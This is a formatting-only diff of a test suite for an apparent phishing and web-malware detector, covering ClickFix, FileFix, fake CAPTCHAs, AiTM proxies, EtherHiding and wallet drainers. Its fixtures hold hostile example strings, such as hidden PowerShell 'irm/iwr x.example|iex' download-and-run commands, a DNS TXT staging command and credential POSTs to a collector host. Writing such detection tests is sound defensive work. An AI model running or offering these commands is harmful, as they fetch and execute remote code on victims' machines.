@@ -329,15 +329,23 @@ def test_plain_command_with_run_dialog_lure_is_clickfix():
 @pytest.mark.parametrize(
     ("page", "text"),
     [
-        ("https://brew.sh/", '/bin/bash -c "$(curl -fsSL '
-         'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'),
+        (
+            "https://brew.sh/",
+            '/bin/bash -c "$(curl -fsSL '
+            'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
+        ),
         ("https://docs.astral.sh/uv/", "curl -LsSf https://astral.sh/uv/install.sh | sh"),
-        ("https://docs.astral.sh/uv/",
-         'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"'),
+        (
+            "https://docs.astral.sh/uv/",
+            'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"',
+        ),
         ("https://scoop.sh/", "irm get.scoop.sh | iex"),
-        ("https://chocolatey.org/install", "Set-ExecutionPolicy Bypass -Scope Process -Force; "
-         "iex ((New-Object System.Net.WebClient).DownloadString("
-         "'https://community.chocolatey.org/install.ps1'))"),
+        (
+            "https://chocolatey.org/install",
+            "Set-ExecutionPolicy Bypass -Scope Process -Force; "
+            "iex ((New-Object System.Net.WebClient).DownloadString("
+            "'https://community.chocolatey.org/install.ps1'))",
+        ),
         ("https://rustup.rs/", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"),
     ],
 )
@@ -427,8 +435,7 @@ def test_installer_repo_prefix_is_case_insensitive():
 @pytest.mark.parametrize(
     "text",
     [
-        'powershell -c "(Resolve-DnsName -Type TXT stage.example -Server 192.0.2.1).Strings'
-        ' | iex"',
+        'powershell -c "(Resolve-DnsName -Type TXT stage.example -Server 192.0.2.1).Strings | iex"',
         "cmd /c nslookup -q=txt stage.example 192.0.2.1 | cmd",
     ],
 )
@@ -752,8 +759,12 @@ def test_ups_login_title_attributes_to_ups():
 
 def test_popups_signups_text_not_ups():
     url = "https://app.example/settings"
-    page = _page(url, title="POP-UPS and SIGN-UPS | Account", forms=[PASSWORD_FORM],
-                 text="Manage your sign-ups and pop-ups. UPS")  # noqa: E501
+    page = _page(
+        url,
+        title="POP-UPS and SIGN-UPS | Account",
+        forms=[PASSWORD_FORM],
+        text="Manage your sign-ups and pop-ups. UPS",
+    )  # noqa: E501
     assert build_facts(_data(url, [page]))["brand"]["name"] != "UPS"
 
 
@@ -803,8 +814,9 @@ def test_ai_builder_hosts_are_tenanted_free_hosting(host, platform):
 
 def test_brand_lure_on_lovable_is_flagged_and_demo_is_quiet():
     url = "https://m365-docs-share.lovable.app/"
-    lure = _page(url, title="Microsoft 365 | Sign in to view document",
-                 text="Microsoft OneDrive shared file")  # noqa: E501
+    lure = _page(
+        url, title="Microsoft 365 | Sign in to view document", text="Microsoft OneDrive shared file"
+    )  # noqa: E501
     data = _data(url, [lure])
     data.allowlisted = {"lovable.app"}
     assert "brand_on_free_hosting" in _hits(data)
@@ -1008,7 +1020,7 @@ def test_discord_webhook_exfil_fires_and_normal_discord_is_quiet():
 
 
 _MS_CLONE_HTML = (
-    '<html><head><title>Sign in to your account</title></head><body>'
+    "<html><head><title>Sign in to your account</title></head><body>"
     '<form><input id="i0116" name="loginfmt"><input type="password" id="i0118">'
     '<input id="idSIButton9" type="submit"></form>'
     '<script>$Config={"urlGetCredentialType":"/common/GetCredentialType"};</script>'
@@ -1018,7 +1030,9 @@ _MS_CLONE_HTML = (
 
 def test_ms_signin_clone_on_foreign_host_fires():
     dom = [{"url": "https://portal-login.example/", "html": _MS_CLONE_HTML}]
-    assert "ms_signin_clone_foreign_host" in _hits(_cap("https://portal-login.example/", dom_html=dom))  # noqa: E501
+    assert "ms_signin_clone_foreign_host" in _hits(
+        _cap("https://portal-login.example/", dom_html=dom)
+    )  # noqa: E501
 
 
 def test_ms_signin_button_on_third_party_is_quiet():
@@ -1028,7 +1042,9 @@ def test_ms_signin_button_on_third_party_is_quiet():
         '<form><input type="password"></form></body></html>'
     )
     dom = [{"url": "https://app.example/login", "html": html}]
-    assert "ms_signin_clone_foreign_host" not in _hits(_cap("https://app.example/login", dom_html=dom))  # noqa: E501
+    assert "ms_signin_clone_foreign_host" not in _hits(
+        _cap("https://app.example/login", dom_html=dom)
+    )  # noqa: E501
 
 
 def test_aitm_ms_paths_on_foreign_host_fires_and_real_ms_is_quiet():
@@ -1036,36 +1052,62 @@ def test_aitm_ms_paths_on_foreign_host_fires_and_real_ms_is_quiet():
     evil = [_req("https://evilproxy.example/common/oauth2/v2.0/authorize", body=body)]
     assert "aitm_ms_paths_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
     real = [_req("https://login.microsoftonline.com/common/oauth2/v2.0/authorize", body=body)]
-    assert "aitm_ms_paths_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501
+    assert "aitm_ms_paths_foreign_host" not in _hits(
+        _cap("https://login.microsoftonline.com/", har=real)
+    )  # noqa: E501
 
 
 def test_idp_cdn_assets_on_foreign_page_fires_and_real_idp_is_quiet():
     cdn = [_req("https://aadcdn.msftauth.net/shared/1.0/logo.png")]
-    page = _page("https://clone.example/", title="Sign in", text="Microsoft sign in",
-                 forms=[PASSWORD_FORM])  # noqa: E501
+    page = _page(
+        "https://clone.example/", title="Sign in", text="Microsoft sign in", forms=[PASSWORD_FORM]
+    )  # noqa: E501
     assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=cdn))
-    ms_page = _page("https://login.live.com/", title="Sign in", text="Microsoft",
-                    forms=[PASSWORD_FORM])  # noqa: E501
-    assert "idp_cdn_assets_foreign_page" not in _hits(_cap("https://login.live.com/", [ms_page], har=cdn))  # noqa: E501
+    ms_page = _page(
+        "https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM]
+    )  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" not in _hits(
+        _cap("https://login.live.com/", [ms_page], har=cdn)
+    )  # noqa: E501
 
 
 def test_ms_session_cookie_on_foreign_host_fires_and_real_ms_is_quiet():
     evil = [_req("https://evilproxy.example/", set_cookie=["ESTSAUTH=abc; Path=/"])]
     assert "ms_session_cookie_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
     real = [_req("https://login.microsoftonline.com/", set_cookie=["ESTSAUTH=abc"])]
-    assert "ms_session_cookie_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501
+    assert "ms_session_cookie_foreign_host" not in _hits(
+        _cap("https://login.microsoftonline.com/", har=real)
+    )  # noqa: E501
 
 
 def test_oauth_error_redirect_abuse_fires_and_silent_sso_is_quiet():
     bounce = [
-        {"from": "https://lure.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none&client_id=x", "type": "js"},  # noqa: E501
-        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://attacker.example/download/x?error=interaction_required", "type": "js"},  # noqa: E501
+        {
+            "from": "https://lure.example/",
+            "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none&client_id=x",
+            "type": "js",
+        },  # noqa: E501
+        {
+            "from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
+            "to": "https://attacker.example/download/x?error=interaction_required",
+            "type": "js",
+        },  # noqa: E501
     ]
-    assert "oauth_error_redirect_abuse" in _hits(_cap("https://attacker.example/download/x", redirects=bounce))  # noqa: E501
+    assert "oauth_error_redirect_abuse" in _hits(
+        _cap("https://attacker.example/download/x", redirects=bounce)
+    )  # noqa: E501
     # Silent SSO: the error bounces back to the IdP's own SPA, not a foreign host.
     sso = [
-        {"from": "https://app.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none", "type": "js"},  # noqa: E501
-        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://login.microsoftonline.com/error?error=login_required", "type": "js"},  # noqa: E501
+        {
+            "from": "https://app.example/",
+            "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none",
+            "type": "js",
+        },  # noqa: E501
+        {
+            "from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
+            "to": "https://login.microsoftonline.com/error?error=login_required",
+            "type": "js",
+        },  # noqa: E501
     ]
     assert "oauth_error_redirect_abuse" not in _hits(_cap("https://app.example/", redirects=sso))
 
@@ -1074,14 +1116,17 @@ def test_illicit_consent_grant_fires_and_first_party_is_quiet():
     bad = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=11111111-2222-3333-4444-555555555555&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
     assert "illicit_consent_grant" in _hits(_cap("https://x.example/", navigations=[{"url": bad}]))
     fp = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
-    assert "illicit_consent_grant" not in _hits(_cap("https://x.example/", navigations=[{"url": fp}]))  # noqa: E501
+    assert "illicit_consent_grant" not in _hits(
+        _cap("https://x.example/", navigations=[{"url": fp}])
+    )  # noqa: E501
 
 
 # ConsentFix (DE-M365-013/014): Azure CLI is first-party; its redirect is loopback.
 _AZ_CLI = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
 _CFX_AUTH = (
     "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id="
-    + _AZ_CLI + "&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8400"
+    + _AZ_CLI
+    + "&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8400"
     "&scope=https%3A%2F%2Fmanagement.core.windows.net%2F.default"
 )
 _PASTE_TEXT = "Sign in, then copy the URL from your address bar and paste it here to continue."
@@ -1139,7 +1184,9 @@ def test_oauth_tutorial_page_is_medium_not_critical():
 def test_graph_command_line_tools_is_first_party():
     url = "https://secure-verify.pages.dev/"
     graph_cli = _CFX_AUTH.replace(_AZ_CLI, "14d82eec-204b-4c2f-b7e8-296a70dab67e")
-    assert "consentfix_authcode_paste_back" in _hits(_cap(url, [_cfx_page(url, links=(graph_cli,))]))  # noqa: E501
+    assert "consentfix_authcode_paste_back" in _hits(
+        _cap(url, [_cfx_page(url, links=(graph_cli,))])
+    )  # noqa: E501
 
 
 def test_firstparty_loopback_without_paste_back_is_only_the_booster():
@@ -1204,16 +1251,18 @@ def test_device_code_share_pretext_with_email_gate_and_script_source():
     """The device-login URL in a script, plus an email-only gate on a share pretext."""
     url = "https://onedrive-files.example.net/"
     gate = {"action": "", "fields": [{"type": "email"}]}
-    page = _dc_page(url, "A secure document was shared with you on OneDrive.",
-                    forms=[gate], links=())  # noqa: E501
+    page = _dc_page(
+        url, "A secure document was shared with you on OneDrive.", forms=[gate], links=()
+    )  # noqa: E501
     page["frames"][0]["scripts"] = [{"sha256": "dc1", "inline": True}]
     data = _cap(url, [page])
     data.scripts = {"dc1": "window.open('https:\\/\\/aka.ms\\/devicelogin')"}
     assert "device_code_phishing_lure" in _hits(data)
 
 
-def _rpc(host="bsc-dataseed.binance.org", to="0x1111111111111111111111111111111111111111",
-         result=None):
+def _rpc(
+    host="bsc-dataseed.binance.org", to="0x1111111111111111111111111111111111111111", result=None
+):
     body = (
         '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":'
         '[{"to":"' + to + '","data":"0x6d4ce63c"},"latest"]}'
@@ -1236,9 +1285,13 @@ _WORD_RESULT = "0x" + "00" * 31 + "2a"  # one 32-byte word: a price, a balance
 
 
 def test_web3_rpc_from_non_wallet_page_fires_and_wallet_app_is_quiet():
-    assert "web3_rpc_from_non_wallet_page" in _hits(_cap("https://compromised.example/", har=_rpc()))  # noqa: E501
+    assert "web3_rpc_from_non_wallet_page" in _hits(
+        _cap("https://compromised.example/", har=_rpc())
+    )  # noqa: E501
     # A real dApp: the page used the wallet, so it is not EtherHiding.
-    dapp = _cap("https://dapp.example/", har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}])  # noqa: E501
+    dapp = _cap(
+        "https://dapp.example/", har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}]
+    )  # noqa: E501
     assert "web3_rpc_from_non_wallet_page" not in _hits(dapp)
 
 
@@ -1257,16 +1310,24 @@ def test_dapp_with_wallet_ui_is_not_etherhiding_without_fake_wallet():
     )
     kit = _page("https://new-dex.example/", title="Swap")
     kit["frames"][0]["scripts"] = [
-        {"src": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.js"}
+        {
+            "src": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.js"
+        }
     ]
-    assert "web3_rpc_from_non_wallet_page" not in _hits(_cap("https://new-dex.example/", [kit], har=_rpc()))  # noqa: E501
+    assert "web3_rpc_from_non_wallet_page" not in _hits(
+        _cap("https://new-dex.example/", [kit], har=_rpc())
+    )  # noqa: E501
 
 
 def test_fake_update_banner_on_dapp_is_not_critical():
     """R-03: an out-of-date-browser banner on a dApp that reads the chain is not ClearFake."""
     banner = "Your browser is out of date. Update Chrome for the best experience."
-    used_wallet = _cap("https://dapp.example/", [_page("https://dapp.example/", "DEX", banner)],
-                       har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}])  # noqa: E501
+    used_wallet = _cap(
+        "https://dapp.example/",
+        [_page("https://dapp.example/", "DEX", banner)],
+        har=_rpc(),
+        wallet_requests=[{"method": "eth_requestAccounts"}],
+    )  # noqa: E501
     assert "fake_browser_update" not in _hits(used_wallet)
     ui = _page("https://dapp.example/", "DEX", banner + " Connect wallet")
     assert "fake_browser_update" not in _hits(_cap("https://dapp.example/", [ui], har=_rpc()))
@@ -1278,8 +1339,16 @@ def test_fake_update_banner_on_dapp_is_not_critical():
 
 # innerHTML/document.write markup counts toward exec.max_len but not code_max_len.
 _MARKUP_EXEC = {"exec": {"count": 40, "max_len": 9000, "max_entropy": 4.8}}
-_BIG_CODE = {"exec": {"count": 2, "max_len": 6000, "max_entropy": 5.4,
-                      "code_count": 2, "code_max_len": 6000, "code_max_entropy": 5.4}}  # noqa: E501
+_BIG_CODE = {
+    "exec": {
+        "count": 2,
+        "max_len": 6000,
+        "max_entropy": 5.4,
+        "code_count": 2,
+        "code_max_len": 6000,
+        "code_max_entropy": 5.4,
+    }
+}  # noqa: E501
 
 
 def test_price_widget_rpc_plus_innerhtml_is_quiet():
@@ -1293,8 +1362,12 @@ def test_rpc_string_result_executed_fires_on_allowlisted():
     """L2-01: the contract answers with a kilobyte string whose base64 layer is the code
     later passed to eval: linked, so no allowlist or lure condition applies."""
     jsapi = {"exec": {**_BIG_CODE["exec"], "code_samples": [_STAGE]}}
-    data = _cap("https://www.bigblog.com/", har=_rpc(result=_abi_string_result(_STAGE_B64)),
-                jsapi=jsapi, allowlisted=["bigblog.com"])  # noqa: E501
+    data = _cap(
+        "https://www.bigblog.com/",
+        har=_rpc(result=_abi_string_result(_STAGE_B64)),
+        jsapi=jsapi,
+        allowlisted=["bigblog.com"],
+    )  # noqa: E501
     web3 = build_facts(data)["web3"]
     assert web3["rpc_large_string_results"] == 1
     assert web3["rpc_result_linked_exec"] is True
@@ -1327,10 +1400,19 @@ def test_large_string_answer_overrides_dapp_ui_and_iframe_wording_does_not_count
     dapp = _page("https://dapp.example/", "DEX", "Connect wallet")
     big = _rpc(result=_abi_string_result(_STAGE))
     assert build_facts(_cap("https://dapp.example/", [dapp], har=big))["web3"]["etherhiding_rpc"]
-    assert not build_facts(_cap("https://dapp.example/", [dapp], har=_rpc()))["web3"]["etherhiding_rpc"]  # noqa: E501
+    assert not build_facts(_cap("https://dapp.example/", [dapp], har=_rpc()))["web3"][
+        "etherhiding_rpc"
+    ]  # noqa: E501
     page = _page("https://blog.example/", "Blog", "Recipes")
-    page["frames"].append({"url": "https://ads.example/w", "title": "", "text": "Connect wallet",
-                           "forms": [], "iframes": []})  # noqa: E501
+    page["frames"].append(
+        {
+            "url": "https://ads.example/w",
+            "title": "",
+            "text": "Connect wallet",
+            "forms": [],
+            "iframes": [],
+        }
+    )  # noqa: E501
     assert build_facts(_cap("https://blog.example/", [page], har=_rpc()))["web3"]["etherhiding_rpc"]
 
 
@@ -1346,9 +1428,14 @@ def _clipcap(url, clip_text, pages=()):
 
 
 def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
-    page = _page("https://verify.example/", title="Verify you are human",
-                 text="Verification ID 4821. I am not a robot.")  # noqa: E501
-    assert "fake_captcha_clipboard_command" in _hits(_clipcap("https://verify.example/", "cmd /c start calc", [page]))  # noqa: E501
+    page = _page(
+        "https://verify.example/",
+        title="Verify you are human",
+        text="Verification ID 4821. I am not a robot.",
+    )  # noqa: E501
+    assert "fake_captcha_clipboard_command" in _hits(
+        _clipcap("https://verify.example/", "cmd /c start calc", [page])
+    )  # noqa: E501
     # Real reCAPTCHA page with no clipboard command.
     real = _page("https://signup.example/", title="Sign up", text="reCAPTCHA verification")
     assert "fake_captcha_clipboard_command" not in _hits(_cap("https://signup.example/", [real]))
@@ -1356,8 +1443,11 @@ def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
 
 def test_cloudflare_footer_is_not_fake_captcha():
     """R-10: every site behind Cloudflare prints its name and a Ray ID."""
-    page = _page("https://shop.example/", title="Shop",
-                 text="Performance & security by Cloudflare. Ray ID: 8a1b2c3d4e. Security check")  # noqa: E501
+    page = _page(
+        "https://shop.example/",
+        title="Shop",
+        text="Performance & security by Cloudflare. Ray ID: 8a1b2c3d4e. Security check",
+    )  # noqa: E501
     lure = build_facts(_cap("https://shop.example/", [page]))["lure"]
     assert lure["fake_captcha"] is False
     assert lure["verification_wording"] is False
@@ -1366,8 +1456,11 @@ def test_cloudflare_footer_is_not_fake_captcha():
 def test_fake_captcha_needs_an_instruction_next_to_the_wording():
     wording = _page("https://v.example/", title="Verify you are human", text="Checking...")
     assert build_facts(_cap("https://v.example/", [wording]))["lure"]["fake_captcha"] is False
-    told = _page("https://v.example/", title="Verify you are human",
-                 text="Press and hold the Windows key, then copy the verification code")  # noqa: E501
+    told = _page(
+        "https://v.example/",
+        title="Verify you are human",
+        text="Press and hold the Windows key, then copy the verification code",
+    )  # noqa: E501
     assert build_facts(_cap("https://v.example/", [told]))["lure"]["fake_captcha"] is True
 
 
@@ -1378,29 +1471,42 @@ def test_genuine_challenge_with_plain_command_is_not_fake_captcha():
     """R-10: a page that loaded real Turnstile, says 'verify you are human' and copies an
     ordinary command (no Run-dialog lure, no ClickFix trait) is not a fake CAPTCHA."""
     page = _page("https://portal.example/", title="Verify you are human", text="One moment")
-    data = _cap("https://portal.example/", [page], har=_TURNSTILE,
-                clipboard=_clip("cmd /c start calc"))  # noqa: E501
+    data = _cap(
+        "https://portal.example/", [page], har=_TURNSTILE, clipboard=_clip("cmd /c start calc")
+    )  # noqa: E501
     assert "fake_captcha_clipboard_command" not in _hits(data)
 
 
 def test_genuine_challenge_does_not_hide_an_unambiguous_command():
     page = _page("https://portal.example/", title="Verify you are human", text="One moment")
-    data = _cap("https://portal.example/", [page], har=_TURNSTILE,
-                clipboard=_clip('powershell -w hidden -c "irm x.example|iex"'))  # noqa: E501
+    data = _cap(
+        "https://portal.example/",
+        [page],
+        har=_TURNSTILE,
+        clipboard=_clip('powershell -w hidden -c "irm x.example|iex"'),
+    )  # noqa: E501
     assert "fake_captcha_clipboard_command" in _hits(data)
 
 
 def test_filefix_command_disguised_as_path_fires_and_plain_command_is_quiet():
-    filefix = "powershell -NoP -W Hidden -c \"iwr x.example|iex\"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx"  # noqa: E501
+    filefix = 'powershell -NoP -W Hidden -c "iwr x.example|iex"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx'  # noqa: E501
     assert "filefix_command_disguised_as_path" in _hits(_clipcap("https://share.example/", filefix))  # noqa: E501
-    assert "filefix_command_disguised_as_path" not in _hits(_clipcap("https://docs.example/", "cmd /c dir C:\\Users"))  # noqa: E501
+    assert "filefix_command_disguised_as_path" not in _hits(
+        _clipcap("https://docs.example/", "cmd /c dir C:\\Users")
+    )  # noqa: E501
 
 
 def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
-    page = _page("https://news-blog.example/", title="News",
-                 text="Your browser is out of date. Update Chrome to continue.")  # noqa: E501
-    data = _cap("https://news-blog.example/", [page],
-                downloads=[{"sha256": "aa", "suggested_filename": "ChromeSetup.exe"}])  # noqa: E501
+    page = _page(
+        "https://news-blog.example/",
+        title="News",
+        text="Your browser is out of date. Update Chrome to continue.",
+    )  # noqa: E501
+    data = _cap(
+        "https://news-blog.example/",
+        [page],
+        downloads=[{"sha256": "aa", "suggested_filename": "ChromeSetup.exe"}],
+    )  # noqa: E501
     data.download_heads = {"aa": b"MZ\x90\x00"}
     assert "fake_browser_update" in _hits(data)
     # browser-update.org banner that only links to the vendor (vendor host, no download here).
@@ -1408,8 +1514,10 @@ def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
     assert "fake_browser_update" not in _hits(_cap("https://browser-update.org/", [ok]))
 
 
-_CRASH_TEXT = ("Your browser stopped abnormally. Security issues detected. "
-               "Press Win + R, then Ctrl + V and Enter to repair your browser.")  # noqa: E501
+_CRASH_TEXT = (
+    "Your browser stopped abnormally. Security issues detected. "
+    "Press Win + R, then Ctrl + V and Enter to repair your browser."
+)  # noqa: E501
 
 
 def test_crashfix_repair_lure_fires_and_vendor_crash_page_is_quiet():
@@ -1418,12 +1526,20 @@ def test_crashfix_repair_lure_fires_and_vendor_crash_page_is_quiet():
     data = _clipcap("https://adblock-help.example/", "cmd /c start calc", [page])
     assert "crashfix_repair_lure" in _hits(data)
     # A vendor's genuine help page about crashes, no clipboard command.
-    help_page = _page("https://support.google.com/chrome/answer/1", title="Fix Chrome crashes",
-                      text="If Chrome has crashed or stopped abnormally, restart it.")  # noqa: E501
-    assert "crashfix_repair_lure" not in _hits(_cap("https://support.google.com/chrome/answer/1", [help_page]))  # noqa: E501
+    help_page = _page(
+        "https://support.google.com/chrome/answer/1",
+        title="Fix Chrome crashes",
+        text="If Chrome has crashed or stopped abnormally, restart it.",
+    )  # noqa: E501
+    assert "crashfix_repair_lure" not in _hits(
+        _cap("https://support.google.com/chrome/answer/1", [help_page])
+    )  # noqa: E501
     # Crash wording on a third-party blog with no command or paste instruction.
-    blog = _page("https://tech-news.example/", title="Why your browser crashed",
-                 text="Browser crashed? Security issues detected in old versions.")  # noqa: E501
+    blog = _page(
+        "https://tech-news.example/",
+        title="Why your browser crashed",
+        text="Browser crashed? Security issues detected in old versions.",
+    )  # noqa: E501
     assert "crashfix_repair_lure" not in _hits(_cap("https://tech-news.example/", [blog]))
 
 
@@ -1459,28 +1575,44 @@ def test_ipfs_credential_page_fires_and_nft_metadata_is_quiet():
 
 def test_client_side_ip_lookup_fires_with_context_and_is_quiet_alone():
     har = [_req("https://ip-api.com/json")]
-    with_cmd = _cap("https://lure.example/", har=har,
-                    clipboard=[{"page": "p0", "api": "x", "text": "powershell -enc " + "A" * 60}])  # noqa: E501
+    with_cmd = _cap(
+        "https://lure.example/",
+        har=har,
+        clipboard=[{"page": "p0", "api": "x", "text": "powershell -enc " + "A" * 60}],
+    )  # noqa: E501
     assert "client_side_ip_geo_lookup" in _hits(with_cmd)
     assert "client_side_ip_geo_lookup" not in _hits(_cap("https://store.example/", har=har))
 
 
 def test_credential_relay_websocket_fires_and_bare_socket_is_quiet():
     frames = [{"url": "wss://relay.example/socket.io/", "direction": "sent", "event": "recieveid"}]
-    brand = _page("https://m365-clone.example/", title="Sign in to your account",
-                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
-    assert "credential_relay_websocket" in _hits(_cap("https://m365-clone.example/", [brand], websocket_frames=frames))  # noqa: E501
+    brand = _page(
+        "https://m365-clone.example/",
+        title="Sign in to your account",
+        text="Microsoft",
+        forms=[PASSWORD_FORM],
+    )  # noqa: E501
+    assert "credential_relay_websocket" in _hits(
+        _cap("https://m365-clone.example/", [brand], websocket_frames=frames)
+    )  # noqa: E501
     plain = _page("https://chat.example/", title="Chat", text="support")
-    assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [plain], websocket_frames=frames))  # noqa: E501
+    assert "credential_relay_websocket" not in _hits(
+        _cap("https://chat.example/", [plain], websocket_frames=frames)
+    )  # noqa: E501
 
 
 def test_credential_prompt_with_allowlisted_chat_socket_is_quiet():
     """L2-04: a support-chat or analytics widget socket is not a relay."""
-    brand = _page("https://m365-clone.example/", title="Sign in to your account",
-                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    brand = _page(
+        "https://m365-clone.example/",
+        title="Sign in to your account",
+        text="Microsoft",
+        forms=[PASSWORD_FORM],
+    )  # noqa: E501
     chat = [{"url": "wss://nexus-websocket-a.intercom.io/pubsub/x", "direction": "received"}]
-    data = _cap("https://m365-clone.example/", [brand], websocket_frames=chat,
-                allowlisted=["intercom.io"])  # noqa: E501
+    data = _cap(
+        "https://m365-clone.example/", [brand], websocket_frames=chat, allowlisted=["intercom.io"]
+    )  # noqa: E501
     assert "credential_relay_websocket" not in _hits(data)
     # The kit's own host is kept: relays often run on the phishing host itself.
     own = [{"url": "wss://m365-clone.example/socket.io/", "direction": "sent"}]
@@ -1492,8 +1624,12 @@ def test_credential_prompt_with_allowlisted_chat_socket_is_quiet():
 def test_socketio_polling_relay_fires():
     """R-05: Socket.IO falls back to (or starts in) HTTP long-polling, which never shows
     up as WebSocket frames."""
-    brand = _page("https://m365-clone.example/", title="Sign in to your account",
-                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    brand = _page(
+        "https://m365-clone.example/",
+        title="Sign in to your account",
+        text="Microsoft",
+        forms=[PASSWORD_FORM],
+    )  # noqa: E501
     poll = "https://relay.example/socket.io/?EIO=4&transport=polling&t=Pabc"
     har = [_req(poll, "POST", post='42["recieveid","x"]\x1e42["send_to_browser",{}]')]
     data = _cap("https://m365-clone.example/", [brand], har=har)
@@ -1506,9 +1642,15 @@ def test_socketio_polling_relay_fires():
 def test_socketio_polling_without_a_credential_prompt_or_to_allowlisted_is_quiet():
     poll = "https://relay.example/socket.io/?EIO=4&transport=polling"
     chat = _page("https://chat.example/", title="Support chat", text="How can we help?")
-    assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [chat], har=[_req(poll)]))  # noqa: E501
-    brand = _page("https://m365-clone.example/", title="Sign in to your account",
-                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    assert "credential_relay_websocket" not in _hits(
+        _cap("https://chat.example/", [chat], har=[_req(poll)])
+    )  # noqa: E501
+    brand = _page(
+        "https://m365-clone.example/",
+        title="Sign in to your account",
+        text="Microsoft",
+        forms=[PASSWORD_FORM],
+    )  # noqa: E501
     widget = [_req("https://widget.intercom.io/socket.io/?EIO=4&transport=polling")]
     assert "credential_relay_websocket" not in _hits(
         _cap("https://m365-clone.example/", [brand], har=widget, allowlisted=["intercom.io"])
@@ -1517,14 +1659,18 @@ def test_socketio_polling_without_a_credential_prompt_or_to_allowlisted_is_quiet
 
 def test_devtools_blocking_fires_with_context_and_is_quiet_alone():
     blocked = [{"kind": "devtools_key", "key": "F12"}, {"kind": "contextmenu"}]
-    clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
-    assert "devtools_blocking" in _hits(_cap("https://kit.example/", clipboard=clip, blocked_input=blocked))  # noqa: E501
+    clip = [{"page": "p0", "api": "x", "text": 'powershell -w hidden -c "irm x|iex"'}]
+    assert "devtools_blocking" in _hits(
+        _cap("https://kit.example/", clipboard=clip, blocked_input=blocked)
+    )  # noqa: E501
     assert "devtools_blocking" not in _hits(_cap("https://gallery.example/", blocked_input=blocked))
 
 
 def test_wallet_drainer_signature_fires_and_dex_approval_is_quiet():
     drain = [{"method": "eth_signTypedData_v4", "primaryType": "PermitBatch"}]
-    assert "wallet_drainer_signature" in _hits(_cap("https://claim-airdrop.example/", wallet_requests=drain))  # noqa: E501
+    assert "wallet_drainer_signature" in _hits(
+        _cap("https://claim-airdrop.example/", wallet_requests=drain)
+    )  # noqa: E501
     # A real DEX on an allowlisted domain: a Permit on Uniswap is expected.
     ok = _cap("https://app.uniswap.org/", wallet_requests=drain, allowlisted=["uniswap.org"])
     assert "wallet_drainer_signature" not in _hits(ok)
@@ -1533,7 +1679,7 @@ def test_wallet_drainer_signature_fires_and_dex_approval_is_quiet():
 def test_tycoon2fa_web_yara():
     kit = b'socket.on("recieveid",f);function tryfindingele(){};var x=".btn-blue-next-btn"'
     assert _yara("tycoon2fa_web").match(data=kit)
-    assert not _yara("tycoon2fa_web").match(data=b'<form><input type=password></form>')
+    assert not _yara("tycoon2fa_web").match(data=b"<form><input type=password></form>")
 
 
 def test_crypto_decrypt_then_write_yara():
@@ -1556,13 +1702,29 @@ LOOSE_PW = {"action": "", "fields": [{"type": "password"}]}
 
 def test_script_posted_credentials_fires_and_same_site_is_quiet():
     page = _page("https://kit.example/login", forms=[LOOSE_PW])
-    reqs = [{"method": "POST", "type": "fetch", "url": "https://collector.net/x",
-             "frame_url": "https://kit.example/login"}]  # noqa: E501
+    reqs = [
+        {
+            "method": "POST",
+            "type": "fetch",
+            "url": "https://collector.net/x",
+            "frame_url": "https://kit.example/login",
+        }
+    ]  # noqa: E501
     har = [_req("https://collector.net/x", "POST", post='{"email":"a@b.c","password":"x"}')]
-    assert "script_posted_credentials" in _hits(_cap("https://kit.example/login", [page], har=har, requests=reqs))  # noqa: E501
-    same = [{"method": "POST", "type": "fetch", "url": "https://kit.example/api",
-             "frame_url": "https://kit.example/login"}]  # noqa: E501
